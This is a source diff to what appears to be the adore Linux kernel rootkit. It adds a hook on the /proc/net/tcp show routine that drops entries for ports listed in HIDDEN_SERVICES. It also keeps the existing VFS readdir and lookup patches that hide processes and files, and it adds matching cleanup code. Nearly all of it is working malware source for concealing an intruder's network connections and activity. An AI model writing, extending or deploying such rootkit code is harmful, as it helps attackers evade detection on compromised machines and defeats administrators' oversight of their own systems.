@@ -460,7 +460,7 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 	
 	uid = inode->i_uid;
 	gid = inode->i_gid;
-	printk("%s: (%d %d)\n", name, uid, gid);
+	//printk("%s: (%d %d)\n", name, uid, gid);
 	
 	//iput(inode);
 	//dput(dentry);
@@ -616,6 +616,38 @@ void kobject_unregister(struct kobject * kobj)
 }
 #endif
 
+struct proc_dir_entry *proc_find_tcp(void)
+{
+	struct proc_dir_entry *p = init_net.proc_net->subdir;
+
+	while (strcmp(p->name, "tcp"))
+		p = p->next;
+	return p;
+}
+
+#define NET_CHUNK 150
+
+int (*orig_tcp4_seq_show)(struct seq_file*, void *) = NULL;
+
+int adore_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+	int i = 0, r = 0;
+	char port[12];
+
+	r = orig_tcp4_seq_show(seq, v);
+	printk("*");
+	for (i = 0; HIDDEN_SERVICES[i]; ++i) {
+		sprintf(port, ":%04X", HIDDEN_SERVICES[i]);
+		/* Ignore hidden blocks */
+		if (strnstr(seq->buf + seq->count-NET_CHUNK,port,NET_CHUNK)) {
+			seq->count -= NET_CHUNK;
+			break;
+		}
+	}
+	
+	return r;
+}
+
 int __init adore_init(void)
 {
 	struct file_operations *new_op;
@@ -624,6 +656,8 @@ int __init adore_init(void)
 	struct file *filep;
 	struct list_head *m = NULL, *p = NULL, *n = NULL;
 	struct module *me = NULL;
+	struct proc_dir_entry *pde = NULL;
+	struct tcp_seq_afinfo *t_afinfo = NULL;
 	
 	memset(hidden_procs, 0, sizeof(hidden_procs));
 
@@ -639,19 +673,20 @@ int __init adore_init(void)
 	orig_proc_lookup = new_inode_op->lookup;
 	new_inode_op->lookup = adore_lookup;
 
-	/*proc_root已经不export了*/
-	//orig_proc_lookup = proc_root.proc_iops->lookup;
-	//new_inode_op = proc_root.proc_iops;
-	//new_inode_op->lookup = adore_lookup;
-
-	//proc_root.proc_iops->lookup = adore_lookup;
-
 	patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
 	patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
 
 	if (opt_fs)
 		patch_vfs(opt_fs, &orig_opt_readdir,
 		          adore_opt_readdir);
+				  
+	pde = proc_find_tcp();
+	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
+	if (t_afinfo) {
+		orig_tcp4_seq_show = t_afinfo->seq_ops.show;
+		t_afinfo->seq_ops.show = adore_tcp4_seq_show;
+		printk("patch proc_net: %x --> %x", orig_tcp4_seq_show, adore_tcp4_seq_show);
+	}
 
 	j = 0;
 	for (i = 0; var_filenames[i]; ++i) {
@@ -696,8 +731,17 @@ void __exit adore_cleanup(void)
 	struct file_operations *new_op;
 	struct inode_operations *new_inode_op;
 	int i = 0, j = 0;
-
+	struct proc_dir_entry *pde = NULL;
+	struct tcp_seq_afinfo *t_afinfo = NULL;
 	struct file *filep;
+	
+	pde = proc_find_tcp();
+	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
+	if (t_afinfo && orig_tcp4_seq_show)
+	{
+		printk("unpatch proc_net: %x --> %x", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
+		t_afinfo->seq_ops.show = orig_tcp4_seq_show;
+	}
 
 	filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep)) {
@@ -709,11 +753,6 @@ void __exit adore_cleanup(void)
 	
 	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
 	new_inode_op->lookup = orig_proc_lookup;
-
-    //new_inode_op = proc_root.proc_iops;
-    //new_inode_op->lookup = orig_proc_lookup;
-
-	//proc_root.proc_iops->lookup = orig_proc_lookup;
 
 	unpatch_vfs(proc_fs, orig_proc_readdir);
 	unpatch_vfs(root_fs, orig_root_readdir);
